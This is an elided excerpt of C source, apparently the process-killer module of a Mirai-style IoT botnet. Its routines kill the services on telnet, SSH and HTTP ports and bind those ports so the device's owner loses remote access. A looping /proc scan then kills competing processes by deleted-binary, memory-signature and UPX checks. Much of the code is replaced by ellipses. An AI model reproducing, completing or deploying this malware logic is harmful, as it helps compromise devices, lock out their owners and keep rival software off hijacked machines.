...
void killer_init(void)
{
    ...
    printf("[botkill] Trying to kill port 23\n");
    if (killer_kill_by_port(htons(23)))
    {
        printf("[botkill] Killed tcp/23 (telnet)\n");
    } else {
        printf("[botkill] Failed to kill port 23\n");
    }
    ...
    printf("[botkill] Bound to tcp/23 (telnet)\n");
#endif
    ...
    {
        printf("[botkill] Killed tcp/22 (SSH)\n");
    }
    ...
    printf("[botkill] Bound to tcp/22 (SSH)\n");
#endif
    ...
    {
        printf("[botkill] Killed tcp/80 (http)\n");
    }
    ...
    printf("[botkill] Bound to tcp/80 (http)\n");
#endif
    ...
    if (!has_exe_access())
    {
        printf("[botkill] Machine does not have /proc/$pid/exe\n");
        return;
    }
    printf("[botkill] Memory scanning processes\n");
    ...
    while (TRUE)
    {
        ...
        {
            printf("[botkill] Failed to open /proc!\n");
            break;
        }
        ...
        while ((file = readdir(dir)) != NULL)
        {
            ...
            if (pid <= killer_highest_pid)
            {
                ...
                {
                    printf("[botkill] %d seconds have passed since last scan. Re-scanning all processes!\n", KILLER_RESTART_SCAN_TIME);
            ...
            if ((rp_len = readlink(exe_path, realpath, sizeof (realpath) - 1)) != -1)
            {
                ...
                {
                    printf("[botkill] Process '%s' has deleted binary!\n", realpath);
                    kill(pid, 9);
                }
                close(fd);
            }
            ...
            {
                printf("[botkill] Memory scan match for binary %s\n", exe_path);
                kill(pid, 9);
            } 
            ...
            {
                printf("[botkill] UPX scan match for binary %s\n", exe_path);
                kill(pid, 9);
            }
            */
...
BOOL killer_kill_by_port(port_t port)
{
    ...
    printf("[botkill] Finding and killing processes holding port %d\n", ntohs(port));
        ...
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            ...
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    ...
                    {
                        printf("[botkill] Found pid %d for port %d\n", util_atoi(pid, 10), ntohs(port));
...
static BOOL has_exe_access(void)
{
    ...
    if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
    {
        ...
        printf("[botkill] Detected we are running out of `%s`\n", killer_realpath);
    }
